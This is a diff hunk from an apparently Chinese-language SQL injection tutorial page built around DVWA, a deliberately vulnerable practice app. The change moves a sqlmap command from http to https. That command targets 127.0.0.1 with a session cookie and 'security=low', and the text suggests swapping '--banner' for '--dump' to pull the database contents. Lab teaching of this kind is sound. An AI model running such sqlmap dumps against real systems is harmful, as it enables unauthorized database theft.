@@ -267,7 +267,7 @@ ERROR 1054 (42S22): Unknown column 'password' in 'where clause'
 
 <p>对于将 DVWA 安全级别设置为 low 时，仅仅只需要执行下列命令就可以获取到 DB 里几乎完整的信息。</p>
 
-<pre><code class="language-sh">$ sqlmap -u http://127.0.0.1/vulnerabilities/sqli/\?id\=1\&amp;Submit\=Submit\# --cookie=&quot;PHPSESSID=jhton35qahj78l3unjea9k2lf7;security=low&quot; -v 3 --banner
+<pre><code class="language-sh">$ sqlmap -u https://127.0.0.1/vulnerabilities/sqli/\?id\=1\&amp;Submit\=Submit\# --cookie=&quot;PHPSESSID=jhton35qahj78l3unjea9k2lf7;security=low&quot; -v 3 --banner
 </code></pre>
 
 <p>当然，换一下相关获取的内容，例如把 <code>--banner</code> 换成 <code>--dump</code> ，我们借此来简单看看 SQL 注入漏洞的可怕之处</p>
